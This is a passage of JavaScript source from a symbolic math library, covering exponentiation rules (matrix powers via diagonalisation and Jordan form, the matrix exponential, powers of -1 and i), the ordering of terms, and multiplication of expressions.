    if (x === Expression.E && getConstant(yn) instanceof Expression.Complex && yd instanceof Expression.Integer) {
      var c = getConstant(yn);
      if (c.real.equals(Expression.ZERO)) {
        var t = y.multiply(Expression.I.negate());
        t = Expression.has(y, Expression.Symbol) ? t : new Expression.Radians(t);
        return t.cos().add(Expression.I.multiply(t.sin()));
      }
      return x.pow(c.real.divide(yd)).multiply(x.pow(c.imaginary.multiply(Expression.I).multiply(yn.divide(c)).divide(yd)));
    }
    if (x === Expression.E && yn instanceof Expression.Addition && yd instanceof Expression.Integer) {
      return x.pow(yn.a.divide(yd)).multiply(x.pow(yn.b.divide(yd)));
    }

    //TODO:
    if (x instanceof Expression.Matrix && (isIntegerOrN(y) || y === Expression.INFINITY)) {
      if (!x.matrix.isSquare()) {
        throw new RangeError("NonSquareMatrixException");
      }
      var an = matrixInN(x.matrix, y);
      if (an != undefined) {
        //?
        var D = x.matrix.map(function (e, i, j) {
          return i === j ? e : Expression.ZERO;
        });
        var N = x.matrix.subtract(D);
        if (x.matrix.isDiagonal()) {
        //  if (Expression.callback != undefined) {
        //    Expression.callback(new Expression.Event("diagonal-matrix-pow", x));
        //  }
        //} else if (x.matrix.isJordanMatrix()) {
        //  if (Expression.callback != undefined) {
        //    Expression.callback(new Expression.Event("Jordan-matrix-pow", x));
        //  }
        } else if (N.isNilpotent() && D.multiply(N).eql(N.multiply(D))) {
          if (Expression.callback != undefined) {
            Expression.callback(new Expression.Event("DpN-matrix-pow", x));
          }
        }

        return an;
      }

      //! 2018-08-26
      if (true) {
        var eigenvalues = Expression.getEigenvalues(x.matrix);
        if (eigenvalues.length === x.matrix.cols()) {
          var eigenvectors = Expression.getEigenvectors(x.matrix, eigenvalues);
          if (eigenvectors.filter(function (v) { return v != null; }).length === x.matrix.cols()) {
            var tmp = Expression.diagonalize(x.matrix, eigenvalues, eigenvectors);
            var L = tmp.L;
            var SL = matrixInN(L, y);
            if (SL != undefined) {
              if (Expression.callback != undefined) {
                Expression.callback(new Expression.Event("pow-using-diagonalization", x));
              }
              if (Expression.callback != undefined) {
                //TODO more details (A=P*D*P^-function (1) { return A^n=P*D*P^-1 * ... * P*D*P^-1=P*D^n*P^1; }
                Expression.callback(new Expression.Event("diagonalize", x));
              }
              return new Expression.Matrix(tmp.T).multiply(SL).multiply(new Expression.Matrix(tmp.T_INVERSED));
            }
          } else {
            var tmp = Expression.getFormaDeJordan(x.matrix, eigenvalues);
            var JN = matrixInN(tmp.J, y);
            if (JN != undefined) {
              if (Expression.callback != undefined) {
                Expression.callback(new Expression.Event("pow-using-Jordan-normal-form", x));
              }
              if (Expression.callback != undefined) {
                //TODO more details (A=P*D*P^-function (1) { return A^n=P*D*P^-1 * ... * P*D*P^-1=P*D^n*P^1; }
                Expression.callback(new Expression.Event("Jordan-decomposition", x));
              }
              //TODO: details !!!
              return new Expression.Matrix(tmp.P).multiply(JN).multiply(new Expression.Matrix(tmp.P_INVERSED));
            }
          }
        }
      }
      //!
    }

    if (Expression.ExponentiationOfMinusOne != null) {
      if (x instanceof Integer && x.compareTo(Expression.ZERO) < 0 || x.equals(Expression.E.negate())) {
        if (y instanceof Expression.Symbol && (y.symbol === "n" || y.symbol === "k")) {
          return new Expression.ExponentiationOfMinusOne(Expression.ONE.negate(), y).multiply(x.negate().pow(y));
        }
        if (y instanceof Addition && y.a instanceof Expression.Symbol && (y.a.symbol === "n" || y.a.symbol === "k") && y.b instanceof Integer) {
          return new Expression.ExponentiationOfMinusOne(Expression.ONE.negate(), y.a).multiply(Expression.ONE.negate().pow(y.b)).multiply(x.negate().pow(y));
        }
        if (y instanceof Multiplication) {
          return x.pow(y.a).pow(y.b);
        }
        if (y instanceof Addition && y.b instanceof Integer) {
          return x.pow(y.a).multiply(x.pow(y.b));
        }
      }
    }

    if (Expression.ExponentiationOfImaginaryUnit != null) {
      if (x instanceof Expression.Complex && x.equals(Expression.I.negate())) {
        return Expression.ONE.negate().pow(y).multiply(x.negate().pow(y));
      }
      if (x instanceof Expression.Complex && (x.equals(Expression.I) || x.real.compareTo(Expression.ZERO) > 0 && x.primeFactor().equals(x))) {//TODO: -i, other complex numbers - ?
        if (y instanceof Expression.Symbol && (y.symbol === "n" || y.symbol === "k")) {
          return new Expression.ExponentiationOfImaginaryUnit(x, y);
        }
        if (y instanceof Addition && y.a instanceof Expression.Symbol && (y.a.symbol === "n" || y.a.symbol === "k") && y.b instanceof Integer) {
          //var t = x.pow(y.b);
          //return new Expression.ExponentiationOfImaginaryUnit(x, t instanceof Expression.Complex ? y.a.add(Expression.ONE) : y.a).multiply(t instanceof Expression.Complex ? t.divide(x) : t);
          return x.pow(y.a).multiply(x.pow(y.b));
        }
        if (y instanceof Multiplication) {
          return x.pow(y.a).pow(y.b);
        }
        if (y instanceof Addition && y.b instanceof Integer) {
          return x.pow(y.a).multiply(x.pow(y.b));
        }
      }
      if (x instanceof Expression.Complex && x.real.equals(Expression.ZERO) && !x.imaginary.equals(Expression.ONE)) {//TODO: -i, other complex numbers - ?
        if (y instanceof Expression.Symbol && (y.symbol === "n" || y.symbol === "k")) {
          return x.imaginary.pow(y).multiply(Expression.I.pow(y));
        }
        if (y instanceof Multiplication) {
          return x.pow(y.a).pow(y.b);
        }
        if (y instanceof Addition) {
          return x.pow(y.a).multiply(x.pow(y.b));
        }
      }
      if (x instanceof Expression.Complex) {//TODO: ?
        var pf = x.primeFactor();
        return x.divide(pf).pow(y).multiply(pf.pow(y));//TODO: test ?
      }

      //TODO:
      if (x instanceof Expression.Integer && y instanceof Division && y.getDenominator() instanceof Integer && y.getNumerator() instanceof Expression.Symbol &&
          (y.getNumerator().symbol === "n" || y.getNumerator().symbol === "k")) {
        return x.pow(Expression.ONE.divide(y.getDenominator())).pow(y.getNumerator());
      }
      //?
      if (x instanceof Expression.Integer && y instanceof Division && y.getDenominator() instanceof Integer && y.getNumerator() instanceof Addition) {
        return x.pow(Expression.ONE.divide(y.getDenominator())).pow(y.getNumerator());
      }
    }

    if (x === Expression.E && y instanceof Expression.Matrix) {
      if (!y.matrix.isSquare()) {
        throw new RangeError("NonSquareMatrixException");
      }
      // https://en.wikipedia.org/wiki/Matrix_exponential#Using_the_Jordan_canonical_form
      var eigenvalues = Expression.getEigenvalues(y.matrix);
      if (eigenvalues.length === y.matrix.cols()) {
        var tmp = Expression.getFormaDeJordan(y.matrix, eigenvalues);
        // exp(A) = exp(P*J*P^-1) = P*exp(D + N)*P^-1 = P*exp(D)*exp(N)*P^-1
        var D = tmp.J.map(function (e, i, j) {
          return i === j ? e : Expression.ZERO;
        });
        var N = tmp.J.map(function (e, i, j) {
          return i !== j ? e : Expression.ZERO;
        });
        var exp = function (N) {
          // https://en.wikipedia.org/wiki/Matrix_exponential#Nilpotent_case
          var z = Matrix.Zero(N.cols(), N.cols());
          var s = z;
          var p = Matrix.I(N.cols());
          var k = 0;
          var f = 1;
          while (!p.eql(z)) {
            var summand = p.scale(Expression.ONE.divide(Integer.fromNumber(f)));
            s = s.add(summand);
            p = p.multiply(N);
            k += 1;
            f *= k;
          }
          return s;
        };
        if (Expression.callback != undefined) {
          Expression.callback(new Expression.Event("exponential-using-Jordan-canonical-form", y));
        }
        //if (Expression.callback != undefined) {
        //  Expression.callback(new Expression.Event("Jordan-decomposition", y));
        //}
        return new Expression.Matrix(tmp.P.multiply(D.map(function (e, i, j) {
          return i === j ? Expression.E.pow(e) : Expression.ZERO;
        }).multiply(exp(N))).multiply(tmp.P_INVERSED));
      }
    }

    //!2019-04-22
    if (x instanceof NthRoot && x.a instanceof Integer) {
      return x.a.pow(y.divide(Expression.Integer.fromNumber(x.n)));
    }

    if (enableEC) {
      if (x === Expression.E && isConstant(y) && !has(y, Expression.Complex) && !has(y, Expression.Logarithm)) {
        return new Expression.Exponentiation(x, y);
      }
      if ((x instanceof Expression.Symbol || Expression.has(x, Expression.Symbol)) && y instanceof Expression.Division && y.getDenominator() instanceof Integer) {
        return x.pow(y.getNumerator())._nthRoot(y.getDenominator().toNumber());
      }
      if (x instanceof Expression.Symbol && y instanceof Expression.Division && isIntegerOrN(y.getNumerator()) && isIntegerOrN(y.getDenominator())) {
        return new Expression.Exponentiation(x, y);
      }
      if (x === Expression.E && y instanceof Expression.Addition) {
        return x.pow(y.a).multiply(x.pow(y.b));
      }
      if (x instanceof Exponentiation && getBase(x) === Expression.E) {//?
        return getBase(x).pow(getExponent(x).multiply(y));
      }
      if (isGoodPolynomial(x) && y instanceof Expression.Division && isIntegerOrN(y.getNumerator()) && isIntegerOrN(y.getDenominator())) {
        return new Expression.Exponentiation(x, y);
      }
    }

    if (x instanceof Expression.Matrix && y instanceof Expression.Addition) {
      return x.pow(y.a).multiply(x.pow(y.b));
    }
    if (x instanceof Expression.Matrix && y instanceof Expression.Multiplication && y.a instanceof Expression.Integer) {
      return x.pow(y.a).pow(y.b);
    }
    if (x instanceof Expression.Matrix && y instanceof Expression.Division) {
      //?
      if (y.getNumerator().equals(Expression.ONE) && y.getDenominator() instanceof Expression.Symbol && (y.getDenominator().symbol === "n" || y.getDenominator().symbol === "k")) {
        return x._nthRoot(y.getDenominator());//TODO: ?
      }
      if (isIntegerOrN(y.getNumerator()) && isIntegerOrN(y.getDenominator())) {
        return x.pow(y.getNumerator()).pow(Expression.ONE.divide(y.getDenominator()));
      }
    }

    //?
    if (y instanceof Expression.Symbol && (y.symbol === "n" || y.symbol === "k")) {
      var qi = QuadraticInteger.toQuadraticInteger(x);//?
      if (qi != null && /*qi.equals(qi.primeFactor()) &&*/ Number(qi.a.toString()) > 0 && qi.D > 0 && (qi.isValid() || true)) {
        if (Number(qi.b.toString()) > 0) {
          return new Expression.ExponentiationOfQuadraticInteger(x, y);
        }
        if (Number(qi.b.toString()) < 0) {
          var xc = qi.conjugate().toExpression();
          return x.multiply(xc).pow(y).divide(xc.pow(y));
        }
      }
      if (qi != null && Number(qi.a.toString()) < 0) {
        return Expression.ONE.negate().pow(y).multiply(qi.toExpression().negate().pow(y));
      }
      /*
      if (qi != null) {
        if (x._nthRoot(2) instanceof Expression.Addition) {//TODO: remove
          var t = x._nthRoot(2).pow(y);
          return new Expression.ExponentiationOfQuadraticInteger(x._nthRoot(2), y.multiply(Expression.TWO));
        }
      }
      */
    }
    /*
    if (y instanceof Multiplication && y.a instanceof Integer && y.b instanceof Expression.Symbol) {
      return x.pow(y.a).pow(y.b);
    }
    */
    //?

    if (enableAN) {
      if (isIntegerOrN(y)) {
        if (y instanceof Addition) {
          for (var iterators = y.summands()[globalThis.Symbol.iterator](), s = iterators.next().value; s != null; s = iterators.next().value) {
            if (s.isNegative()) {
              return x.pow(y.subtract(s)).divide(x.pow(s.negate()));
            }
          }
        }
        if (y.isNegative()) {
          return Expression.ONE.divide(x.pow(y.negate()));
        }
        // (1+sqrt(2))**(2n) - ((1+sqrt(2))**2)**(n)
        if (Expression.isConstant(x) && !getConstant(y).equals(Expression.ONE)) {//?
          return x.pow(getConstant(y)).pow(y.divide(getConstant(y)));
        }
        var goodX = x instanceof Expression.Symbol || x instanceof Expression.Addition && !(Expression.has(x, Expression.Sin) || Expression.has(x, Expression.Cos));
        if (goodX) {
          return new Expression.Exponentiation(x, y);
        }
      }
      if (x instanceof Exponentiation && getBase(x) instanceof Integer && getBase(x).compareTo(Expression.ONE) > 0 && isIntegerOrN(getExponent(x).getNumerator()) && isIntegerOrN(getExponent(x).getDenominator())) {//TODO: FIX
        return getBase(x).pow(getExponent(x).multiply(y));
      }
      if (x instanceof Exponentiation && isGoodPolynomial(getBase(x)) &&
          isIntegerOrN(getExponent(x)) &&
          isIntegerOrN(y)) {//TODO: FIX
        return getBase(x).pow(getExponent(x).multiply(y));
      }
      if (x instanceof Exponentiation && isGoodPolynomial(getBase(x)) &&
          isIntegerOrN(getExponent(x).inverse()) &&
          isIntegerOrN(y.inverse())) {//TODO: FIX
        return getBase(x).pow(getExponent(x).multiply(y));
      }
    }

    if (Expression.has(x, Expression.Sin) || Expression.has(x, Expression.Cos)) {
      return Expression._replaceBySinCos(Expression._replaceSinCos(x).pow(y));
    }

    if (x === Expression.E && y instanceof Expression.Logarithm) {
      return y.a;
    }
    if (x === Expression.E && y instanceof Expression.Multiplication && y.a instanceof Integer && y.b instanceof Expression.Logarithm) {
      return x.pow(y.b).pow(y.a);
    }
    if (x === Expression.E && y instanceof Expression.Multiplication && y.a instanceof Expression.Symbol && y.b instanceof Expression.Logarithm) {
      return x.pow(y.b).pow(y.a);
    }
    if (x instanceof Expression.Integer && Expression.has(y, Expression.Logarithm)) {//?
      return Expression.E.pow(x.logarithm().multiply(y));
    }

    //!new 2020-12-11
    if (x instanceof Exponentiation && getBase(x) instanceof Integer && getBase(x).compareTo(Expression.TWO) >= 0 && isIntegerOrN(y)) { // (3^x)^k
      // https://en.wikipedia.org/wiki/Exponentiation#Identities_and_properties
      //TODO: positive real base check - ?
      return getBase(x).pow(getExponent(x).multiply(y));
    }
    //!
    
    //!new 2022-07-26
    //TODO: more cases
    if (x === Expression.E && y instanceof Expression.ComplexConjugate && y.a instanceof Expression.Symbol) {
      return new Expression.Exponentiation(x, y);
    }

    throw new RangeError("NotSupportedError");
  };

  // compare two expression, which are factors (multiplicaiton operands) of terms (addition operands)
  Expression.prototype.compare4Addition = function (y) {
    var x = this;
    if (x instanceof Integer && y instanceof Integer) {
      return x.compareTo(y);
    }
    if (x instanceof Expression.Symbol && y instanceof Integer) {
      return +1;
    }
    if (x instanceof Integer && y instanceof Expression.Symbol) {
      return -1;
    }
    if (x instanceof Expression.Symbol && y instanceof Expression.Symbol) {
      return x.symbol < y.symbol ? -1 : (y.symbol < x.symbol ? +1 : 0);
    }
    //!
    if (x instanceof Expression.Matrix && y instanceof MatrixSymbol) {
      return +1;
    }
    if (x instanceof MatrixSymbol && y instanceof Expression.Matrix) {
      return -1;
    }
    if (x instanceof Expression.Matrix && y instanceof Expression.Matrix) {
      /*
      if (x.matrix.rows() === y.matrix.rows() &&
          x.matrix.cols() === y.matrix.cols()) {
        var rows = x.matrix.rows();
        var cols = x.matrix.cols();
        for (var i = 0; i < rows; i += 1) {
          for (var j = 0; j < cols; j += 1) {
            var c = x.matrix.e(i, j).compare4Addition(y.matrix.e(i, j));
            if (c !== 0) {
              return c;
            }
          }
        }
      }
      */
      return 0;
    }

    //!new 2016-12-17
    //NOTE: the `x instanceof Addition || y instanceof Addition` should be used before `x instanceof Multiplication || y instanceof Multiplication`
    if (x instanceof Addition || y instanceof Addition) {
      return Addition.compare4Addition(x, y);
    }

    //!new 2016-10-09
    if (x instanceof Multiplication || y instanceof Multiplication) {
      return Multiplication.compare4Addition(x, y);
    }


    //!new 2018-10-11
    if (x instanceof Integer && y instanceof Expression.Function) {
      return -1;
    }

    //!new 2018-11-12
    if (x instanceof Division && y instanceof Division) {
      return x.a.compare4Addition(y.a) || x.b.compare4Addition(y.b);//?
    }
    if (x instanceof Expression && y instanceof Division) {
      return +1;//?
    }
    if (x instanceof Division && y instanceof Expression) {
      return -1;//?
    }

    if (x instanceof Expression.Matrix) {
      return -1;
    }
    if (y instanceof Expression.Matrix) {
      return +1;
    }

    //!2019-02-18
    if (x instanceof Integer && y instanceof Expression.Complex) {
      return -1;//?
    }
    if (x instanceof Expression.Complex && y instanceof Integer) {
      return +1;//?
    }
    //!

    if (x.equals(y)) {
      return 0;//!
    }

    if (x instanceof Expression.Exponentiation || y instanceof Expression.Exponentiation) {
      return getBase(x).compare4Addition(getBase(y)) || (0 - getExponent(x).compare4Addition(getExponent(y)));
    }

    //!new 2017-02-10
    if (y instanceof Expression.Symbol) {
      return -1;
    }

    //!
    throw new RangeError();
  };

  var compare = function (x, y) {
    return x.compare4Addition(y);
  };

  var compare4Multiplication = function (x, y) {
    //TODO: Exponentiation + Exponentiation, Exponentiation + Symbol, Symbol + Exponentiation
    return x.compare4Multiplication(y);
  };

  var getBase = function (x) {
    //TODO: ?
    //if (x instanceof NthRoot) {
    //  return x.a;
    //}
    return x instanceof Exponentiation ? x.a : x;
  };
  var getExponent = function (x) {
    //TODO: ?
    //if (x instanceof NthRoot) {
    //  return Expression.Integer.fromNumber(x.n);
    //}
    return x instanceof Exponentiation ? x.b : Expression.ONE;
  };

  // use getContent instead (?)
  var getConstant = function (e, allowExpressionPolynomialRoot) {
allowExpressionPolynomialRoot = allowExpressionPolynomialRoot == undefined ?  undefined : allowExpressionPolynomialRoot;

    if (e instanceof Integer) {
      return e;
    } else if (e instanceof Expression.Complex) {
      return e;
    } else if (e instanceof Expression.ExpressionPolynomialRoot) {
      if (allowExpressionPolynomialRoot) {
        return e;
      }
    } else if (e instanceof Multiplication) {
      var c = undefined;
      var x = e;
      for (var iteratory = x.factors()[globalThis.Symbol.iterator](), y = iteratory.next().value; y != null; y = iteratory.next().value) {
        var t = getConstant(y, allowExpressionPolynomialRoot);
        c = c == undefined ? t : t.multiply(c);
      }
      if (c != undefined) {
        return c;
      }
    } else if (e instanceof Addition) { // -5*x+15
      var c = undefined;
      for (var iteratorx = e.summands()[globalThis.Symbol.iterator](), x = iteratorx.next().value; x != null; x = iteratorx.next().value) {
        var t = getConstant(x, allowExpressionPolynomialRoot);
        //c = c == undefined ? t : integerGCD(t, c);
        c = c == undefined ? t : complexGCD(t, c);
      }
      if (c != undefined) {
        return c;
      }
    }
    return Expression.ONE;
  };
  var getTerm = function (x, flag0) {
  // TODO: fix performance ?
    if (x instanceof Integer) {
      return undefined;
    } else if (x instanceof Expression.Complex) {
      return undefined;
    } else if (x instanceof Expression.ExpressionPolynomialRoot) {
      if (flag0) {
        return undefined;
      }
    } else if (x instanceof Multiplication) {
      var terms = [];
      for (var iteratory = x.factors()[globalThis.Symbol.iterator](), y = iteratory.next().value; y != null; y = iteratory.next().value) {
        var t = getTerm(y, flag0);
        if (t != undefined) {
          terms.push(t);
        }
      }
      var result = undefined;
      for (var j = terms.length - 1; j >= 0; j -= 1) {
        result = result == undefined ? terms[j] : new Multiplication(result, terms[j]);
      }
      return result;
    } else if (x instanceof Addition) {
      return x.divide(getConstant(x));
    }
    return x;
  };

  Expression.getConstant = getConstant;

  var multiplyByInteger = function (x, y) {
    if (x.compareTo(Expression.ZERO) === 0) {
      return x;
    }
    if (x.compareTo(Expression.ONE) === 0) {
      return y;
    }
    return new Multiplication(x, y);
  };

  Expression.prototype.multiplyExpression = function (x) {
    var y = this;

    if (x instanceof Expression && y instanceof Multiplication) {
      return x.multiply(y.a).multiply(y.b);
    }
    if (x instanceof Multiplication && y instanceof Expression) {
      var c = compare4Multiplication2(x.b, y);
      if (c === 0) {
        return x.a.multiply(x.b.multiply(y));
      }
      return c > 0 ? x.a.multiply(y).multiply(x.b) : new Multiplication(x, y);
    }

    //!
    /*
    if (x instanceof IdentityMatrix && y instanceof MatrixSymbol) {
      return y;
    }
    if (y instanceof IdentityMatrix && x instanceof MatrixSymbol) {
      return x;
    }
    */
    //!
    // rest

    var c = 0;
    if (x instanceof Integer && y instanceof Expression.Symbol) {
      return multiplyByInteger(x, y);
    }
    if (x instanceof Expression.Symbol && y instanceof Integer) {
      return multiplyByInteger(y, x);
    }
    if (x instanceof Expression.Symbol && y instanceof Expression.Symbol) {
      c = compare4Multiplication(x, y);
      if (c === 0) {
        return x.pow(Expression.TWO);
      }
      return c > 0 ? new Multiplication(y, x) : new Multiplication(x, y);
    }
    if (x instanceof Integer && y instanceof Exponentiation) {
      return multiplyByInteger(x, y);
    }
    if (x instanceof Exponentiation && y instanceof Integer) {
      return multiplyByInteger(y, x);
    }
    //!new 2022-06-20
    //TODO: FIX
    if (getBase(x) instanceof Expression.MatrixSymbol || getBase(y) instanceof Expression.MatrixSymbol) {
      c = compare4Multiplication(getBase(x), getBase(y));
      if (c === 0) {
        if (getExponent(x).equals(new Expression.Symbol("T")) || getExponent(y).equals(new Expression.Symbol("T"))) {
          return new Multiplication(x, y);
        }
      }
    }
    if (x instanceof Exponentiation && y instanceof Expression.Symbol) {
      c = compare4Multiplication(getBase(x), y);
      if (c === 0) {
        return y.pow(getExponent(x).add(Expression.ONE));
      }
      return c > 0 ? new Multiplication(y, x) : new Multiplication(x, y);
    }
    if (x instanceof Expression.Symbol && y instanceof Exponentiation) {
      c = compare4Multiplication(x, getBase(y));
      if (c === 0) {
        return x.pow(getExponent(y).add(Expression.ONE));
      }
      return c > 0 ? new Multiplication(y, x) : new Multiplication(x, y);
    }
    if (x instanceof Exponentiation && y instanceof Exponentiation) {
      c = compare4Multiplication(getBase(x), getBase(y));
      if (c === 0) {
        return getBase(x).pow(getExponent(x).add(getExponent(y)));
      }
      return c > 0 ? new Multiplication(y, x) : new Multiplication(x, y);
    }

    if (x instanceof SquareRoot && y instanceof SquareRoot) {
      if (x.a instanceof Integer && y.a instanceof Exponentiation) {//TODO: fix
        return new Multiplication(x, y);
      }
      // optimization:
      var g = x.a.gcd(y.a);
      return g.multiply(x.a.divide(g).multiply(y.a.divide(g)).squareRoot());
      //return x.a.multiply(y.a).squareRoot();
    }
    if (x instanceof NthRoot && x.n === 3 && y instanceof NthRoot && y.n === 3) {
      // optimization:
      //var g = x.a.gcd(y.a);
      //return g.pow(2/3).multiply(x.a.divide(g).multiply(y.a.divide(g))._nthRoot(3));
      return x.a.multiply(y.a)._nthRoot(3);
    }
    if (x instanceof NthRoot && y instanceof NthRoot) {
      //if (x.n === y.n) {
      //  return x.a.multiply(y.a)._nthRoot(x.n);
      //}
      //!2021-02-02 - hack
      if (x.a instanceof Integer && !(y.a instanceof Integer) && x.n < y.n && getVariable(y.a)._pow(2).gcd(x.a).equals(x.a)) {
        if (Expression.isConstant(x) && Expression.isConstant(y)) {
          return y.multiply(x);
        }
      }
      //!
      var ng = Math.gcd(x.n, y.n);
      //TODO: remove check for integers (?)
      if (!(x.a instanceof Integer) && (!(y.a instanceof Integer) || !x.a._pow(2).gcd(y.a).equals(Expression.ONE) || getVariable(x.a)._pow(2).gcd(y.a).equals(getVariable(x.a)._pow(2))) || !x.a.gcd(y.a).equals(Expression.ONE)) {
        var v = Expression.pow(x.a, y.n / ng).multiply(Expression.pow(y.a, x.n / ng));
        var nn = x.n / ng * y.n;
        return v._nthRoot(nn);
      }
      if (!(x.a instanceof Integer) && x.n === 2 && y.a instanceof Integer && y.n === 4 && !(getConstant(x.a.getNumerator()).multiply(y.a)._nthRoot(y.n) instanceof NthRoot)) {//HACK
        return x.a.multiply(y.a._nthRoot(2))._nthRoot(2);
      }
      return x.n < y.n ? new Multiplication(x, y) : (x.n > y.n ? new Multiplication(y, x) : x.a.multiply(y.a)._nthRoot(x.n));
    }

    //!
    if (x instanceof MatrixSymbol && y instanceof Expression.Matrix) {
      return new Multiplication(x, y);
    }
    if (x instanceof Expression.Matrix && y instanceof MatrixSymbol) {
      return new Multiplication(x, y);
    }
    if (has(x, MatrixSymbol) && y instanceof Expression.Matrix) { // X^2*{{1,2},{3,4}}
      return new Multiplication(x, y);
    }
    if (x instanceof Expression.Matrix && has(y, MatrixSymbol)) { // {{1,2},{3,4}}*X^2
      return new Multiplication(x, y);
    }

    //!
    //throw new RangeError();
    if (x instanceof Integer && y instanceof Expression) {
      if (x.compareTo(Expression.ZERO) === 0) {
        return x;
      }
      if (x.compareTo(Expression.ONE) === 0) {
        return y;
      }
    }
    if (x instanceof Expression && y instanceof Integer) {
      if (y.compareTo(Expression.ZERO) === 0) {
        return y;
      }
      if (y.compareTo(Expression.ONE) === 0) {
        return x;
      }
    }

/*
    // TODO: remove
    if (x instanceof Expression.Complex && y instanceof Expression.ExponentiationOfImaginaryUnit) {
      //!hack
      //TODO: remove
      if (x.real.equals(Expression.ZERO)) {
        if (!x.equals(Expression.I)) {
        //if (x.primeFactor().equals(y.a)) {//TODO: fix
        if (y.a.equals(Expression.I)) {//TODO: fix
        return x.imaginary.multiply(y.multiply(Expression.I));
        }
        //}
        }
      } else {
        if (getBase(y).equals(Expression.I)) {//TODO: remove
          return x.imaginary.multiply(Expression.I).multiply(y).add(x.real.multiply(y));
        }
      }
    }
    if (x instanceof Expression.ExponentiationOfImaginaryUnit && y instanceof Expression.Complex) {
      //!hack
      //TODO: remove
      if (y.real.equals(Expression.ZERO)) {
        if (!y.equals(Expression.I)) {
        return y.imaginary.multiply(x.multiply(Expression.I));
        }
      } else {
        if (getBase(x).equals(Expression.I)) {//TODO: remove
        return y.imaginary.multiply(Expression.I).multiply(x).add(y.real.multiply(x));
        }
      }
    }
*/

    //var cmp = x instanceof Expression.Complex && y instanceof Expression.ExponentiationOfImaginaryUnit && !x.equals(getBase(y)) ? -1 : (x instanceof Expression.ExponentiationOfImaginaryUnit && y instanceof Expression.Complex && !y.equals(getBase(x)) ? +1 : compare4Multiplication(getBase(x), getBase(y)));
    var cmp = x instanceof Expression.Complex && y instanceof Expression.ExponentiationOfImaginaryUnit ? -1 : (x instanceof Expression.ExponentiationOfImaginaryUnit && y instanceof Expression.Complex ? +1 : compare4Multiplication(getBase(x), getBase(y)));
    if (cmp === 0) {
      return getBase(x).pow(getExponent(x).add(getExponent(y)));
    }
    if (cmp < 0) {
      return new Multiplication(x, y);
    }
    if (cmp > 0) {
      return new Multiplication(y, x);
    }

  };

  function Iterator() {
  }
  if ("\v" !== "v") {
    Object.defineProperty(Iterator.prototype, "done", {
      get: function () {
        return this.value == null;
      }
    });
  }
  Iterator.prototype[globalThis.Symbol.iterator] = function () {
    return this;
  };

  function TermFactorsIterator(e) {
    this.value = undefined;
    this.e = e;
  }
  TermFactorsIterator.prototype = Object.create(Iterator.prototype);
  TermFactorsIterator.prototype.next = function () {
    this.value = this.e instanceof Multiplication ? this.e.b : (this.e instanceof Integer || this.e instanceof Expression.Complex || this.e instanceof Expression.ExpressionPolynomialRoot ? null : this.e);
    this.e = this.e instanceof Multiplication ? this.e.a : undefined;
    return this;
  };

  function termFactors(e) {
    return new TermFactorsIterator(e);
  }

  var compare4Addition = function (x, y) {
    // undefined | Symbol | Exponentiation | Multiplication
    var i = termFactors(x);
    var j = termFactors(y);
    var a = i.next().value;
    var b = j.next().value;
    while (a != null && b != null) {

      //!
      // x^3*y^2, x^2*y^3
      var cmp = 0 - compare(getBase(a), getBase(b));
      if (cmp === 0) {
        cmp = compare(getExponent(a), getExponent(b));
      }
      if (cmp !== 0) {
        return cmp;
      }
      a = i.next().value;
      b = j.next().value;
    }
    //!new 2020-02-13
    if (a instanceof Expression.Matrix || b instanceof Expression.Matrix) {
      if (y instanceof Integer && x instanceof Multiplication) {
        return +1;//?
      }
      if (x instanceof Integer && y instanceof Multiplication) {
        return -1;//?
      }
      if (a != null && i.next().value != null) {
        return +1;
      }
      if (b != null && j.next().value != null) {
        return -1;
      }
      return 0;
    }
    //!
    return a != null ? +1 : (b != null ? -1 : 0);
  };

  var addSimilar = function (x, y) {
    if (x instanceof Expression.Matrix && y instanceof Expression.Matrix) {
      return x.add(y);
    }
    var c1 = getConstant(x);//TODO: remove (?)
    var c2 = getConstant(y);
    var i = termFactors(getTerm(x));
    var j = termFactors(getTerm(y));
    var a = i.next().value;
    var b = j.next().value;
    var result = Expression.ONE;
    var added = false;
    while (a != null || b != null) {
      var f = null;
      if (a instanceof Expression.Matrix &&
          a.matrix.isScalar() &&
          isScalar(a.matrix.e(0, 0)) && !a.matrix.e(0, 0).equals(Expression.ZERO) && //TODO: !?
          b instanceof Expression.Matrix &&
          b.matrix.isScalar() &&
          isScalar(b.matrix.e(0, 0)) && !b.matrix.e(0, 0).equals(Expression.ZERO) && //TODO: !?
          a.matrix.rows() === b.matrix.rows() && a.matrix.cols() === b.matrix.cols() &&
          !a.equals(b)) {
        var f = function (a, x) {
          //return Expression._map(function (e) { return e.equals(a) ? a.matrix.divide(a.matrix.e(0, 0)) : e; }, a.matrix.e(0, 0).multiply(x));
          return a.matrix.e(0, 0).multiply(x).multiply(a.inverse());
        };
        return addSimilar(f(a, x), f(b, y));
      } else if (!added && (a instanceof Expression.Matrix || b instanceof Expression.Matrix) && (a == null || b == null || !a.equals(b))) {
        added = true;
        f = (a == null ? c1 : a.multiply(c1)).add(b == null ? c2 : b.multiply(c2));
        c1 = Expression.ONE;
        c2 = Expression.ONE;
      } else {
        if (!a.equals(b)) {
          //throw new TypeError();
          return null;
        }
        f = a;
      }
      result = f.multiply(result);//!TODO: depends on the iteration order !!!
      a = i.next().value;
      b = j.next().value;
    }
    if (!added) {
      result = c1.add(c2).multiply(result);
    }
    return result;
  };

  Expression.getComplexNumberParts = function (e) {
    if (e instanceof Expression.Division) {
      var tmp = Expression.getComplexNumberParts(e.getNumerator());
      return {real: tmp.real.divide(e.getDenominator()), imaginary: tmp.imaginary.divide(e.getDenominator())};
    }
    if (!Expression.has(e, Expression.Complex)) {
      return {real: e, imaginary: Expression.ZERO};
    }
    var real = [];
    var imaginary = [];
    for (var iteratorx = e.summands()[globalThis.Symbol.iterator](), x = iteratorx.next().value; x != null; x = iteratorx.next().value) {
      var c = undefined;
      for (var iteratory = x.factors()[globalThis.Symbol.iterator](), y = iteratory.next().value; y != null; y = iteratory.next().value) {
        if (c == undefined && y instanceof Expression.Complex) {
          c = y;
        }
      }
      if (c == undefined) {
        real.push(x);
      } else if (c.real.equals(Expression.ZERO)) {
        imaginary.push(x.multiply(Expression.I.negate()));
      } else {
        var r = null;
        if (x !== c) {
          for (var iteratory = x.factors()[globalThis.Symbol.iterator](), y = iteratory.next().value; y != null; y = iteratory.next().value) {
            if (y !== c) {
              r = r == null ? y : r.multiply(y);
            }
          }
        }
        if (r == null) {
          //TODO: !?
          real.push(c.real);
          imaginary.push(c.imaginary);
        } else {
          real.push(r.multiply(c.real));
          imaginary.push(r.multiply(c.imaginary));
        }
      }
    }
    return {
      real: _sum(real),
      imaginary: _sum(imaginary)
    };
  };

  Expression.prototype.addExpression = function (x) {
